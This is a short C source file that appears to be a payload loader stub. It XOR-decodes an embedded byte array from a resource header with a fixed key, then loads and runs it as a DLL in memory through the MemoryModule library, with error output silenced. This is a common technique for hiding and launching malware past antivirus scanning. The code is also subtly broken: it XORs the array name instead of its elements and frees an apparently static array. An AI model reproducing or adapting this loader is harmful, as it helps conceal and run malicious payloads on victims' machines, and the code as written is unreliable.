#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <malloc.h>
#include "MemoryModule.h"
#include "res\a.h"
////////////////////////////////////////////////////////////////////////////

int RunForAarray(void)
{
  HMEMORYMODULE handle;
  int result = -1;
  for (int i = 0; i < sizeof(aArray); i++)
  {
    //szArray = ~ szArray; // 取反 ~
    aArray = aArray ^ 123; // 异或 ^
  }
  handle = MemoryLoadLibrary(aArray);
  if (handle == NULL)
  {
    //_tprintf(_T("Can't load library from memory.\n"));
    goto exit;
  }
  result = MemoryCallEntryPoint(handle);
  if (result < 0) {
    //_tprintf(_T("Could not execute entry point: %d\n"), result);
  }
  MemoryFreeLibrary(handle);

exit:
  if (aArray)
    free(aArray);
  return result;
}
int main(int argc, char* argv[])
{
    return RunForAarray();
}
